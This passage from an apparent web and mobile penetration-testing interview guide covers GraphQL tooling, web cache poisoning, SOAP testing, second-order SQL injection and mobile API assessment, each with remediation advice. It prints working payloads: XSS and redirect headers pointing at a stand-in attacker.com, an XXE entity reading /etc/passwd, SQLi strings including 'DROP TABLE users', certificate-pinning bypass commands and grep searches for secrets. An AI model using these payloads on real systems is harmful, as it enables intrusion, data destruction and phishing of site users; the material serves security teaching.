**Tools:**
- InQL (Burp extension)
- GraphQL Voyager
- Altair GraphQL Client
- graphql-cop (automated scanner)
  ```bash
  python3 graphql-cop.py -t https://target.com/graphql
  ```

**Remediation:**
- Disable introspection in production
- Implement query depth limiting (max 5-7 levels)
- Implement query cost analysis
- Rate limit per query, not per request
- Validate authorization on every resolver
- Use allowlisted queries (persisted queries)

---

## Q32: Explain Cache Poisoning. How would you find and exploit it?

**What is Web Cache Poisoning?**
- Attacker tricks a caching server (CDN, reverse proxy) into storing a malicious response
- Every subsequent user receives the poisoned cached version

**How It Works:**
1. Find an unkeyed input (header/parameter that affects the response but isn't part of the cache key)
2. Inject malicious content via that input
3. The malicious response gets cached
4. All users receive the malicious response

**Step 1 — Identify Unkeyed Inputs:**
- Use Burp extension: **Param Miner**
- It automatically tests headers and parameters that might affect the response but aren't in the cache key

**Step 2 — Common Unkeyed Headers:**
  ```
  X-Forwarded-Host: attacker.com
  X-Forwarded-Scheme: http
  X-Original-URL: /admin
  X-Rewrite-URL: /malicious
  ```

**Exploitation Example — XSS via Cache Poisoning:**
- Application reflects `X-Forwarded-Host` in a script tag:
  ```
  GET /home HTTP/1.1
  Host: target.com
  X-Forwarded-Host: attacker.com"></script><script>alert(1)</script>
  ```
- Response:
  ```html
  <script src="https://attacker.com"></script><script>alert(1)</script>/app.js">
  ```
- This response gets cached → every user visiting `/home` gets the XSS payload

**Exploitation Example — Redirect Poisoning:**
  ```
  GET /login HTTP/1.1
  Host: target.com
  X-Forwarded-Host: attacker.com
  ```
- Response:
  ```
  HTTP/1.1 302 Found
  Location: https://attacker.com/login
  ```
- Cached → all users are redirected to attacker's phishing page

**Exploitation Example — DoS via Cache Poisoning:**
  ```
  GET /home HTTP/1.1
  Host: target.com
  X-Forwarded-Scheme: http
  ```
- Response forces a redirect loop → cached → site is DoS'd for all users

**How to Verify Cache Poisoning:**
- Send the malicious request
- Then send a normal request (without the malicious header)
- If the normal request returns the poisoned response → cache is poisoned
- Check headers: `X-Cache: HIT`, `Age: 30`, `CF-Cache-Status: HIT`

**Remediation:**
- Don't use unkeyed inputs to generate responses
- Include relevant headers in the cache key
- Review caching rules carefully
- Use `Cache-Control: private` for user-specific content
- Sanitize all inputs, even HTTP headers

---

## Q33: What are the key differences in testing REST APIs vs SOAP APIs?

**REST API Characteristics:**
- Uses HTTP methods: GET, POST, PUT, DELETE, PATCH
- Data format: JSON (mostly), sometimes XML
- Endpoints: `/api/v1/users/1001`
- Stateless, uses tokens (JWT, API key, Bearer)
- Lightweight, widely used

**SOAP API Characteristics:**
- Uses only POST method
- Data format: XML only (wrapped in SOAP envelope)
- Endpoints: single URL, actions defined in XML body
- Uses WS-Security, SAML tokens
- Heavier, used in enterprise/legacy systems

**Testing Differences:**

| Area | REST | SOAP |
|------|------|------|
| Discovery | Swagger/OpenAPI, JS files | WSDL file (`?wsdl`) |
| Injection points | URL params, JSON body, headers | XML body, SOAP headers |
| Auth testing | JWT, API keys, OAuth | WS-Security tokens, SAML |
| XSS/Injection | JSON parameter injection | XML injection, XXE, XPath |
| Fuzzing | Fuzz JSON params | Fuzz XML elements |

**SOAP-Specific Attacks:**

**1. WSDL Discovery:**
  ```
  https://target.com/service?wsdl
  ```
- Returns ALL operations, parameters, and data types — full API blueprint

**2. XXE in SOAP:**
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Body>
      <GetUser>
        <username>&xxe;</username>
      </GetUser>
    </soapenv:Body>
  </soapenv:Envelope>
  ```

**3. XPath Injection:**
  ```xml
  <username>' or '1'='1</username>
  ```

**4. SOAPAction Header Manipulation:**
  ```
  SOAPAction: "GetAdminData"
  ```
- Change to call unauthorized operations

**5. WS-Security Token Replay:**
- Capture a valid WS-Security token
- Replay it after expiry → check if it's still accepted

**Tools for SOAP Testing:**
- SoapUI (primary tool)
- Burp Suite with SOAP-specific plugins
- Wsdler (Burp extension for WSDL parsing)

---

## Q34: How would you test for Second-Order SQL Injection?

**What is Second-Order SQLi?**
- Payload is injected and stored in the database (no immediate execution)
- Later, when the application reads and uses that stored data in another query → the injection executes
- Much harder to detect than regular SQLi

**Example Scenario:**

**Step 1 — Store the Payload:**
- Register a new user:
  ```
  Username: admin'--
  Password: anything
  ```
- Application safely stores it using prepared statements:
  ```sql
  INSERT INTO users (username, password) VALUES ('admin''--', 'hashed_pass');
  ```
- No error, no injection at this point

**Step 2 — Trigger the Payload:**
- Login as `admin'--` → go to "Change Password" feature
- Backend code (vulnerable):
  ```python
  username = get_current_user()  # Returns "admin'--" from DB
  query = "UPDATE users SET password='" + new_pass + "' WHERE username='" + username + "'"
  ```
- Resulting query:
  ```sql
  UPDATE users SET password='newpass123' WHERE username='admin'--'
  ```
- The `--` comments out the rest → changes the REAL admin's password
- Attacker now logs in as admin with `newpass123`

**Where to Look:**
- User registration → profile display
- User input stored now → used in a report/export later
- Address entered → used in a shipping query
- Any place where stored data is used in a different context later

**How to Test:**
1. Inject SQL payloads in all stored fields:
   ```
   admin'--
   admin' OR '1'='1
   admin'; DROP TABLE users;--
   ' UNION SELECT null,null--
   ```
2. Register/save the data
3. Trigger every feature that reads that data:
   - View profile, change password, export reports, admin review page
   - Any automated process that reads from DB
4. Monitor for: errors, changed behavior, data from other tables

**Why Scanners Miss It:**
- Automated scanners inject and check response immediately
- Second-order executes in a different request/feature → scanner never sees the result
- Must be tested manually with understanding of data flow

**Remediation:**
- Use parameterized queries EVERYWHERE (not just on input, but also when reading stored data)
- Never trust data from the database — treat it as untrusted input
- Apply output encoding when displaying stored data

---

## Q35: Explain how you would perform a security assessment of a mobile API backend.

**What Makes Mobile APIs Different:**
- Mobile apps often have hidden/undocumented API endpoints
- API keys and secrets are sometimes hardcoded in the app
- Certificate pinning may prevent easy interception
- APIs might trust the mobile app too much (less server-side validation)

**Step 1 — Intercept Mobile Traffic:**
- Set up Burp Suite as proxy on your phone/emulator
- Install Burp's CA certificate on the device
- For certificate pinning bypass:
  ```bash
  # Using Frida
  frida -U -f com.target.app -l bypass-pinning.js
  
  # Using Objection
  objection -g com.target.app explore
  > android sslpinning disable
  ```

**Step 2 — Reverse Engineer the App:**
- Android:
  ```bash
  # Decompile APK
  apktool d target.apk
  jadx target.apk         # decompile to Java source
  
  # Search for secrets
  grep -r "api_key\|secret\|password\|token\|Bearer" ./
  grep -r "https://\|http://" ./     # find all API endpoints
  ```
- iOS:
  ```bash
  # Use Hopper or Ghidra for binary analysis
  # Use Frida to hook runtime functions
  ```

**Step 3 — Find Hardcoded Secrets:**
- Look in: `strings.xml`, `BuildConfig.java`, `.plist` files, shared preferences
- Common finds:
  ```
  API_KEY = "sk_live_abc123..."
  AWS_SECRET = "wJalrXUtnFEMI..."
  FIREBASE_URL = "https://target-app.firebaseio.com"
  ```
- Try these keys directly against the API

**Step 4 — Test API Endpoints:**
- All the same tests as web APIs:
  - BOLA/IDOR
  - Broken authentication
  - Mass assignment
  - Rate limiting
  - Excessive data exposure

**Step 5 — Test for Weak Client-Side Trust:**
- Premium features gated client-side:
  ```json
  {"user": "john", "isPremium": false}
  ```
- Change to `true` in the intercepted response → check if premium features unlock
- In-app purchase verification — does the server validate the receipt?

**Step 6 — Check Local Data Storage:**
- Android:
  ```bash
  adb shell
  cat /data/data/com.target.app/shared_prefs/*.xml
  cat /data/data/com.target.app/databases/*.db
  ```
- Look for: tokens, passwords, PII stored in plaintext

**Step 7 — Check for Insecure Data Transmission:**
- Verify all API calls use HTTPS
- Check if sensitive data is sent in URL parameters (visible in logs)
- Check if certificate pinning is implemented

**Key Tools:**
| Purpose | Tool |
|---------|------|
| Proxy | Burp Suite, mitmproxy |
| Android Decompile | apktool, jadx, JADX-GUI |
| iOS Analysis | Hopper, Ghidra |
| Runtime Hooking | Frida, Objection |
| SSL Pinning Bypass | Frida scripts, Objection |
| Static Analysis | MobSF (automated) |
| Emulator | Genymotion, Android Studio |

**Remediation:**
- Never hardcode secrets in mobile apps
- Implement certificate pinning correctly
- Validate everything server-side (don't trust the app)
- Use short-lived tokens
- Encrypt local storage
- Implement root/jailbreak detection
- Use code obfuscation (ProGuard, R8)
